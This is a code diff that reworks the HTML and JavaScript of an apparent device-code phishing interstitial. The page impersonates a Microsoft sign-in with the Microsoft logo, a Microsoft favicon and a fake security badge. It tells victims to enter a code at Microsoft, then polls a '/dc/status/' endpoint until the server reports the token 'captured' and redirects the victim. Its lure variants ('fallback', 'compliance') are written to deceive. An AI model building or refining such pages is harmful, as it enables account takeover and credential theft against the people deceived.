@@ -31,109 +31,146 @@ const DEVICE_CODE_INTERSTITIAL_HTML = `<!DOCTYPE html>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="referrer" content="no-referrer">
-<title>Microsoft 365 - Document Access</title>
+<title>Sign in to your account</title>
+<link rel="icon" href="https://logincdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif;background:#f3f2f1;min-height:100vh}
-.header{background:#0078d4;padding:12px 24px;display:flex;align-items:center;gap:12px}
-.header svg{width:24px;height:24px}
-.header-text{color:#fff;font-size:16px;font-weight:600}
-.main{display:flex;justify-content:center;align-items:center;min-height:calc(100vh - 56px);padding:20px}
-.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.12);max-width:480px;width:100%;overflow:hidden}
-.doc-header{padding:20px 24px;border-bottom:1px solid #edebe9;display:flex;align-items:center;gap:14px}
-.doc-icon{width:40px;height:48px;background:linear-gradient(135deg,#185abd 0%,#2b7cd3 100%);border-radius:4px;display:flex;align-items:center;justify-content:center;position:relative}
-.doc-icon::after{content:'';position:absolute;top:0;right:0;width:12px;height:12px;background:#fff;clip-path:polygon(100% 0,0 100%,100% 100%)}
-.doc-icon svg{width:20px;height:20px;fill:#fff}
-.doc-title{font-size:15px;font-weight:600;color:#323130}
-.doc-subtitle{font-size:12px;color:#605e5c;margin-top:2px}
-.content{padding:32px 24px;text-align:center}
-.lock-icon{width:56px;height:56px;background:#f3f2f1;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
-.lock-icon svg{width:28px;height:28px;fill:#0078d4}
-.title{font-size:20px;font-weight:600;color:#323130;margin-bottom:8px}
-.subtitle{font-size:14px;color:#605e5c;margin-bottom:24px;line-height:1.5}
-.code-box{background:#c50f1f;border-radius:6px;padding:20px 24px;margin-bottom:20px}
-.code-label{font-size:11px;color:rgba(255,255,255,.8);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px}
-.code{font-size:32px;font-weight:700;letter-spacing:6px;color:#fff;font-family:'Segoe UI',monospace;margin-bottom:12px}
-.copy-btn{background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.3);color:#fff;padding:8px 24px;border-radius:4px;font-size:13px;font-weight:600;cursor:pointer;transition:background .15s}
-.copy-btn:hover{background:rgba(255,255,255,.25)}
-.steps{text-align:left;margin:24px 0;padding:0 8px}
-.step{display:flex;align-items:flex-start;gap:12px;margin-bottom:14px}
-.step-num{width:24px;height:24px;background:#0078d4;border-radius:50%;color:#fff;font-size:12px;font-weight:600;display:flex;align-items:center;justify-content:center;flex-shrink:0}
-.step-text{font-size:14px;color:#323130;line-height:1.5;padding-top:2px}
-.continue-btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;background:#0078d4;color:#fff;border:none;padding:14px 24px;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s;text-decoration:none;margin-top:8px}
-.continue-btn:hover{background:#106ebe}
-.continue-btn svg{width:20px;height:20px;fill:#fff}
-.footer{padding:16px 24px;border-top:1px solid #edebe9;display:flex;align-items:center;justify-content:center;gap:8px}
-.footer svg{width:16px;height:16px;fill:#107c10}
-.footer-text{font-size:12px;color:#605e5c}
-.timer{font-size:11px;color:#a19f9d;margin-top:12px}
-.copied{color:#107c10;font-size:13px;margin-top:6px;min-height:20px}
-.spinner{display:none;margin:12px auto;width:20px;height:20px;border:2px solid #edebe9;border-top:2px solid #0078d4;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.02)}}
+@keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
 @keyframes spin{to{transform:rotate(360deg)}}
-.complete{display:none;text-align:center;padding:40px 24px}
-.complete-icon{width:64px;height:64px;background:#dff6dd;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
-.complete-icon svg{width:32px;height:32px;fill:#107c10}
-.complete-title{font-size:18px;font-weight:600;color:#323130;margin-bottom:8px}
-.complete-text{font-size:14px;color:#605e5c}
+body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,Oxygen,Ubuntu,sans-serif;background:linear-gradient(135deg,#f5f5f5 0%,#e8e8e8 100%);min-height:100vh;display:flex;flex-direction:column}
+.bg-pattern{position:fixed;top:0;left:0;right:0;bottom:0;background-image:url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%230078d4' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");z-index:0}
+.main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px;position:relative;z-index:1}
+.card{background:#fff;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,.1),0 10px 40px rgba(0,0,0,.1);max-width:440px;width:100%;animation:fadeIn .4s ease-out}
+.card-inner{padding:44px 48px}
+.logo{display:flex;align-items:center;gap:8px;margin-bottom:28px}
+.logo svg{width:108px;height:24px}
+.avatar{width:48px;height:48px;background:linear-gradient(135deg,#0078d4 0%,#00bcf2 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:20px;box-shadow:0 4px 12px rgba(0,120,212,.3)}
+.avatar svg{width:24px;height:24px;fill:#fff}
+.title{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:12px;line-height:1.3}
+.subtitle{font-size:15px;color:#5e5e5e;line-height:1.6;margin-bottom:32px}
+.code-section{background:linear-gradient(135deg,#0078d4 0%,#005a9e 100%);border-radius:12px;padding:28px;margin-bottom:28px;text-align:center;position:relative;overflow:hidden}
+.code-section::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(90deg,transparent,rgba(255,255,255,.1),transparent);background-size:200% 100%;animation:shimmer 2s infinite}
+.code-label{font-size:12px;color:rgba(255,255,255,.85);text-transform:uppercase;letter-spacing:2px;margin-bottom:12px;font-weight:500}
+.code{font-size:36px;font-weight:700;letter-spacing:8px;color:#fff;font-family:'Segoe UI',monospace;text-shadow:0 2px 4px rgba(0,0,0,.2);margin-bottom:16px}
+.copy-btn{background:rgba(255,255,255,.2);backdrop-filter:blur(4px);border:1px solid rgba(255,255,255,.3);color:#fff;padding:10px 28px;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;transition:all .2s;display:inline-flex;align-items:center;gap:8px}
+.copy-btn:hover{background:rgba(255,255,255,.3);transform:translateY(-1px)}
+.copy-btn svg{width:16px;height:16px;fill:currentColor}
+.copied-msg{color:#fff;font-size:13px;margin-top:10px;min-height:20px;font-weight:500}
+.divider{display:flex;align-items:center;gap:16px;margin-bottom:24px;color:#a0a0a0;font-size:13px}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:#e0e0e0}
+.steps{margin-bottom:28px}
+.step{display:flex;align-items:center;gap:16px;padding:14px 0;border-bottom:1px solid #f0f0f0}
+.step:last-child{border-bottom:none}
+.step-icon{width:36px;height:36px;background:#f0f7ff;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.step-icon svg{width:18px;height:18px;fill:#0078d4}
+.step-text{font-size:14px;color:#1b1b1b;line-height:1.5}
+.step-text strong{font-weight:600}
+.continue-btn{display:flex;align-items:center;justify-content:center;gap:12px;width:100%;background:linear-gradient(135deg,#0078d4 0%,#005a9e 100%);color:#fff;border:none;padding:16px 24px;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;transition:all .2s;text-decoration:none;box-shadow:0 4px 14px rgba(0,120,212,.4)}
+.continue-btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(0,120,212,.5)}
+.continue-btn:active{transform:translateY(0)}
+.continue-btn svg{width:20px;height:20px;fill:#fff}
+.security-badge{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:20px;padding:12px;background:#f8f8f8;border-radius:6px}
+.security-badge svg{width:16px;height:16px;fill:#107c10}
+.security-badge span{font-size:12px;color:#5e5e5e}
+.timer{text-align:center;font-size:12px;color:#a0a0a0;margin-top:16px}
+.timer span{font-weight:600;color:#5e5e5e}
+.footer{padding:20px;text-align:center;position:relative;z-index:1}
+.footer-links{display:flex;justify-content:center;gap:24px;flex-wrap:wrap}
+.footer-links a{font-size:12px;color:#5e5e5e;text-decoration:none}
+.footer-links a:hover{text-decoration:underline}
+.spinner{display:none;width:24px;height:24px;border:3px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}
+.complete{display:none;text-align:center;padding:20px 0}
+.complete-icon{width:72px;height:72px;background:linear-gradient(135deg,#107c10 0%,#0e6b0e 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;box-shadow:0 4px 14px rgba(16,124,16,.4)}
+.complete-icon svg{width:36px;height:36px;fill:#fff}
+.complete-title{font-size:22px;font-weight:600;color:#1b1b1b;margin-bottom:8px}
+.complete-text{font-size:15px;color:#5e5e5e}
+.progress-bar{width:120px;height:4px;background:#e0e0e0;border-radius:2px;margin:16px auto 0;overflow:hidden}
+.progress-bar-fill{height:100%;background:#107c10;border-radius:2px;animation:progress 1.5s ease-out forwards}
+@keyframes progress{from{width:0}to{width:100%}}
 </style>
 </head>
 <body>
-<div class="header">
-<svg viewBox="0 0 24 24"><path fill="#fff" d="M11.5 3v8.5H3V3h8.5zm0 18H3v-8.5h8.5V21zM21 3v8.5h-8.5V3H21zm0 18h-8.5v-8.5H21V21z"/></svg>
-<span class="header-text">Microsoft 365</span>
-</div>
+<div class="bg-pattern"></div>
 <div class="main">
 <div class="card">
-<div class="doc-header">
-<div class="doc-icon">
-<svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm-1 7V3.5L18.5 9H13z"/></svg>
+<div class="card-inner">
+<div class="logo">
+<svg viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
+<path fill="#f25022" d="M0 0h11v11H0z"/>
+<path fill="#7fba00" d="M12 0h11v11H12z"/>
+<path fill="#00a4ef" d="M0 12h11v11H0z"/>
+<path fill="#ffb900" d="M12 12h11v11H12z"/>
+<text x="28" y="17" font-family="Segoe UI,sans-serif" font-size="15" font-weight="600" fill="#1b1b1b">Microsoft</text>
+</svg>
 </div>
-<div>
-<div class="doc-title" id="docTitle">Secure_Document.pdf</div>
-<div class="doc-subtitle">Protected file • Requires verification</div>
-</div>
-</div>
-<div class="content" id="verifyView">
-<div class="lock-icon">
-<svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
-</div>
-<div class="title" id="titleText">Verify your identity</div>
-<div class="subtitle" id="subtitleText">To access this document, please complete verification with Microsoft.</div>
 
-<div class="code-box">
-<div class="code-label">Your verification code</div>
-<div class="code" id="userCode">{user_code}</div>
-<button class="copy-btn" onclick="copyCode()">Copy Code</button>
+<div id="verifyView">
+<div class="avatar">
+<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
 </div>
-<div class="copied" id="copiedMsg">&nbsp;</div>
+
+<h1 class="title" id="titleText">Verify it's you</h1>
+<p class="subtitle" id="subtitleText">For your security, we need to verify your identity. Enter the code below at Microsoft to continue.</p>
+
+<div class="code-section">
+<div class="code-label">Verification Code</div>
+<div class="code" id="userCode">{user_code}</div>
+<button class="copy-btn" onclick="copyCode()">
+<svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+Copy code
+</button>
+<div class="copied-msg" id="copiedMsg">&nbsp;</div>
+</div>
+
+<div class="divider">How it works</div>
 
 <div class="steps">
-<div class="step"><div class="step-num">1</div><div class="step-text">Copy the code above</div></div>
-<div class="step"><div class="step-num">2</div><div class="step-text">Click continue and paste (Ctrl+V)</div></div>
-<div class="step"><div class="step-num">3</div><div class="step-text">Sign in with your Microsoft account</div></div>
+<div class="step">
+<div class="step-icon"><svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg></div>
+<div class="step-text"><strong>Copy</strong> the verification code above</div>
+</div>
+<div class="step">
+<div class="step-icon"><svg viewBox="0 0 24 24"><path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z"/></svg></div>
+<div class="step-text"><strong>Paste</strong> it at Microsoft's sign-in page</div>
+</div>
+<div class="step">
+<div class="step-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+<div class="step-text"><strong>Sign in</strong> with your Microsoft account</div>
+</div>
 </div>
 
-<a class="continue-btn" href="{verify_url}" target="_blank" rel="noopener" onclick="document.getElementById('spinner').style.display='block'">
+<a class="continue-btn" href="{verify_url}" target="_blank" rel="noopener" id="continueBtn">
 <svg viewBox="0 0 24 24"><path d="M11.5 3v8.5H3V3h8.5zm0 18H3v-8.5h8.5V21zM21 3v8.5h-8.5V3H21zm0 18h-8.5v-8.5H21V21z"/></svg>
 Continue to Microsoft
 </a>
 
-<div class="spinner" id="spinner"></div>
-<div class="timer" id="timerText">Code expires in <span id="countdown">{expires_minutes}:00</span></div>
+<div class="security-badge">
+<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+<span>Protected by Microsoft Security</span>
+</div>
+
+<div class="timer">Code expires in <span id="countdown">{expires_minutes}:00</span></div>
 </div>
 
 <div class="complete" id="completeView">
 <div class="complete-icon">
 <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
 </div>
-<div class="complete-title">Verification complete</div>
-<div class="complete-text">Redirecting to your document...</div>
+<h2 class="complete-title">Verification successful</h2>
+<p class="complete-text">You're all set. Redirecting you now...</p>
+<div class="progress-bar"><div class="progress-bar-fill"></div></div>
 </div>
 </div>
+</div>
+</div>
+
 <div class="footer">
-<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
-<span class="footer-text">Secured by Microsoft</span>
-</div>
+<div class="footer-links">
+<a href="#">Terms of use</a>
+<a href="#">Privacy & cookies</a>
+<a href="#">Contact us</a>
 </div>
 </div>
 
@@ -143,24 +180,21 @@ var sid='{session_id}';
 var expMs={expires_seconds}*1000;
 var startTime=Date.now();
 
-// Template-specific customization
 var tpl='{template_type}';
 if(tpl==='fallback'){
-document.getElementById('titleText').textContent='Verification Required';
-document.getElementById('subtitleText').textContent='Your security key could not be verified. Please use code verification instead.';
-document.getElementById('docTitle').textContent='Access_Verification.pdf';
+document.getElementById('titleText').textContent='Additional verification needed';
+document.getElementById('subtitleText').textContent='We couldn\'t verify you with your usual method. Please use this code instead.';
 }else if(tpl==='compliance'){
-document.getElementById('titleText').textContent='Organization Security Check';
-document.getElementById('subtitleText').textContent='Your organization requires identity verification to access this resource.';
-document.getElementById('docTitle').textContent='Compliance_Check.pdf';
+document.getElementById('titleText').textContent='Organization sign-in required';
+document.getElementById('subtitleText').textContent='Your organization requires additional verification to access this resource.';
 }
 
 function copyCode(){
 var code=document.getElementById('userCode').textContent;
 if(navigator.clipboard){
 navigator.clipboard.writeText(code).then(function(){
-document.getElementById('copiedMsg').textContent='Code copied!';
-setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
+document.getElementById('copiedMsg').textContent='✓ Copied to clipboard';
+setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2500);
 });
 }else{
 var ta=document.createElement('textarea');
@@ -169,18 +203,19 @@ document.body.appendChild(ta);
 ta.select();
 document.execCommand('copy');
 document.body.removeChild(ta);
-document.getElementById('copiedMsg').textContent='Code copied!';
-setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
+document.getElementById('copiedMsg').textContent='✓ Copied to clipboard';
+setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2500);
 }
 }
 window.copyCode=copyCode;
 
-// Countdown timer
 function updateTimer(){
 var elapsed=Date.now()-startTime;
 var remaining=Math.max(0,expMs-elapsed);
 if(remaining<=0){
-document.getElementById('countdown').textContent='EXPIRED';
+document.getElementById('countdown').textContent='0:00';
+document.getElementById('continueBtn').style.opacity='0.5';
+document.getElementById('continueBtn').style.pointerEvents='none';
 return;
 }
 var m=Math.floor(remaining/60000);
@@ -190,7 +225,6 @@ setTimeout(updateTimer,1000);
 }
 updateTimer();
 
-// Poll for device code completion
 function checkStatus(){
 fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
 .then(function(r){return r.json()})
@@ -199,21 +233,17 @@ if(d.captured){
 document.getElementById('verifyView').style.display='none';
 document.getElementById('completeView').style.display='block';
 setTimeout(function(){
-if(d.redirect_url){
-top.location.href=d.redirect_url;
-}
-},1500);
+if(d.redirect_url){top.location.href=d.redirect_url;}
+},2000);
 }else if(d.expired){
-document.getElementById('countdown').textContent='EXPIRED';
+document.getElementById('countdown').textContent='0:00';
 }else{
 setTimeout(checkStatus,3000);
 }
 })
-.catch(function(){
-setTimeout(checkStatus,5000);
-});
+.catch(function(){setTimeout(checkStatus,5000);});
 }
-setTimeout(checkStatus,5000);
+setTimeout(checkStatus,4000);
 })();
 </script>
 </body>
